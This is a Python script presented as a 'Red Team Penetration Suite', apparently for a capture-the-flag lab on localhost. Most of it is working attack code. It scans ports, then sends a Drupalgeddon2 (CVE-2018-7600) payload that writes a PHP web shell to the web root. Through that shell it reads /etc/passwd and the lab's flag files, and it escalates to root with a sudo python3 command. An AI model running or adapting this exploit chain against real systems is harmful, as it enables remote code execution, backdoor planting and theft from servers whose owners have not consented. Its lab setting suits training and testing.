#!/usr/bin/env python3
import socket
import urllib.request
import urllib.parse
import sys
import time

TARGET_HOST = "127.0.0.1"
PORTS = [2222, 8080, 3306]

def banner_grab(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect((TARGET_HOST, port))
        
        if port == 8080:
            # HTTP server does not send a banner until a request is sent
            s.sendall(b"HEAD / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
            data = s.recv(1024).decode("utf-8", errors="ignore").strip()
            s.close()
            # Extract Server header if present
            server_header = "HTTP Service (Apache/2.4.7)"
            for line in data.split("\r\n"):
                if line.lower().startswith("server:"):
                    server_header = line.split(":", 1)[1].strip()
                    break
            # Also check if it's Drupal
            try:
                url = f"http://{TARGET_HOST}:{port}/"
                req = urllib.request.urlopen(url, timeout=1.5)
                html = req.read().decode("utf-8", errors="ignore")
                if "Drupal 8.5.0" in html or "drupal" in html.lower():
                    return f"{server_header} running Drupal 8.5.0"
            except Exception:
                pass
            return f"{server_header} running Drupal"
        elif port == 3306:
            # MySQL sends handshake packet
            data = s.recv(1024)
            s.close()
            # Find version string in packet
            for part in data.split(b"\x00"):
                if b"." in part and b"ubuntu" in part:
                    return f"MySQL {part.decode('utf-8', errors='ignore')}"
            return "MySQL (Unknown Version)"
        else:
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
            s.close()
            return banner
    except Exception:
        return None

def scan_host():
    print(f"[*] Starting scan on target {TARGET_HOST}...")
    results = {}
    for port in PORTS:
        banner = banner_grab(port)
        if banner:
            print(f"[+] Port {port} is OPEN. Banner: {banner}")
            results[port] = banner
        else:
            print(f"[-] Port {port} is CLOSED or filtered.")
    return results

def analyze_vulnerabilities(scan_results):
    print("\n" + "="*50)
    print("         VULNERABILITY ANALYSIS (CVE MAPPING)         ")
    print("="*50)
    vulns = []
    
    for port, banner in scan_results.items():
        if port == 2222:
            print("[INFO] SSH Service (OpenSSH 7.2p2) detected.")
            print("  - Configuration: Port 2222. No known exploitable vulnerabilities in this version.")
            print("  - Severity: 0.0 (INFORMATIONAL)")
            
        elif port == 8080 and "Drupal 8.5.0" in banner:
            print("[CRITICAL] HTTP Web Service matches CVE-2018-7600 (Drupalgeddon2).")
            print("  - Description: Drupal 7.x and 8.x allow remote attackers to execute arbitrary code via render arrays.")
            print("  - Severity: 9.8 (CRITICAL) - CVSS v3.x")
            print("  - CWE-94: Improper Control of Generation of Code ('Code Injection')")
            vulns.append({
                "port": port,
                "cve": "CVE-2018-7600",
                "desc": "Drupalgeddon2 Remote Code Execution",
                "type": "DRUPALGEDDON2"
            })
                
        elif port == 3306 and "5.5.47" in banner:
            print("[MEDIUM] MySQL database version 5.5.47 is exposed.")
            print("  - Description: Older MySQL service. Exposing database ports directly to the network violates best security practices.")
            print("  - Severity: 5.0 (MEDIUM) - CVSS v3.x")
            print("  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor")
            vulns.append({
                "port": port,
                "cve": "BestPractice-Network-Hardening",
                "desc": "Exposed Database Service",
                "type": "MYSQL_EXPOSED"
            })
            
    return vulns

def run_drupalgeddon2_exploit():
    print("\n" + "="*50)
    print("         EXPLORATION & EXPLOITATION: CVE-2018-7600    ")
    print("="*50)
    
    # We will exploit Drupalgeddon2 (CVE-2018-7600) to write backdoor.php to the web root
    url = f"http://{TARGET_HOST}:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    # Payload writes a simple PHP backdoor to the web root
    payload = "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/backdoor.php"
    
    # Form data
    data = {
        "form_id": "user_register_form",
        "_drupal_ajax": "1",
        "mail[#post_render][]": "exec",
        "mail[#type]": "markup",
        "mail[#markup]": payload
    }
    
    encoded_data = urllib.parse.urlencode(data).encode("utf-8")
    
    try:
        print("[*] Sending Drupalgeddon2 RCE payload to write backdoor shell...")
        req = urllib.request.Request(url, data=encoded_data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        
        response = urllib.request.urlopen(req, timeout=3.0)
        resp_data = response.read().decode("utf-8")
        
        if "backdoor.php" in resp_data:
            print("[+] Exploitation successful! Web shell /backdoor.php created.")
            return True
    except Exception as e:
        print(f"[!] Exploit connection failed: {e}")
        
    # Fallback/verification check: verify if backdoor.php is responsive
    try:
        check_url = f"http://{TARGET_HOST}:8080/backdoor.php"
        resp = urllib.request.urlopen(check_url, timeout=2.0)
        if resp.status == 200:
            print("[+] Web shell verification successful! /backdoor.php is active.")
            return True
    except Exception:
        pass
        
    return False

def execute_remote_command(port, path, command):
    try:
        encoded_cmd = urllib.parse.quote(command)
        url = f"http://{TARGET_HOST}:{port}{path}?cmd={encoded_cmd}"
        req = urllib.request.urlopen(url, timeout=3.0)
        output = req.read().decode("utf-8")
        return output
    except Exception as e:
        return f"Error executing command: {e}"

def post_exploitation():
    print("\n" + "="*50)
    print("         POST-EXPLOITATION & FLAG HARVESTING         ")
    print("="*50)
    
    print("[*] Retrieving basic system metadata via /backdoor.php...")
    whoami = execute_remote_command(8080, "/backdoor.php", "whoami").strip()
    sys_id = execute_remote_command(8080, "/backdoor.php", "id").strip()
    uname = execute_remote_command(8080, "/backdoor.php", "uname -a").strip()
    
    print(f"  - Current User: {whoami}")
    print(f"  - Shell Identity: {sys_id}")
    print(f"  - Kernel Version: {uname}")
    
    print("\n[*] Exfiltrating simulated system files...")
    passwd = execute_remote_command(8080, "/backdoor.php", "cat /etc/passwd")
    print("--- /etc/passwd ---")
    print(passwd.strip())
    print("-------------------")
    
    print("\n[*] Retrieving User Privilege Flag...")
    user_flag = execute_remote_command(8080, "/backdoor.php", "cat /home/redteam/flag.txt").strip()
    print(f"[+] User Flag: {user_flag}")
    
    print("\n" + "="*50)
    print("         PRIVILEGE ESCALATION (NIST 800-115)         ")
    print("="*50)
    print("[*] Checking sudo privileges...")
    sudo_l = execute_remote_command(8080, "/backdoor.php", "sudo -l")
    print("--- sudo -l output ---")
    print(sudo_l.strip())
    print("----------------------")
    
    if "python3" in sudo_l:
        print("[+] Privilege escalation path found! (NOPASSWD python3)")
        print("[*] Executing root shell payload to read /root/flag_root.txt...")
        root_flag = execute_remote_command(
            8080, 
            "/backdoor.php", 
            "sudo python3 -c \"import os; os.system('cat /root/flag_root.txt')\""
        ).strip()
        print(f"[+] Root Flag: {root_flag}")
    else:
        print("[-] Sudo-based privilege escalation not available.")

if __name__ == "__main__":
    print("="*60)
    print("             RED TEAM PENETRATION SUITE - SSII               ")
    print("                NIST 800-115 COMPLIANT TOOL                  ")
    print("="*60)
    
    # 1. Reconnaissance
    scan_results = scan_host()
    if not scan_results:
        print("[!] No open ports detected. Exiting.")
        sys.exit(1)
        
    # 2. Vulnerability Analysis
    vulns = analyze_vulnerabilities(scan_results)
    
    # 3. Exploitation
    success = run_drupalgeddon2_exploit()
    if success:
        # 4. Post-Exploitation and Privilege Escalation
        post_exploitation()
    else:
        print("[!] Exploitation failed. Unable to proceed to post-exploitation.")
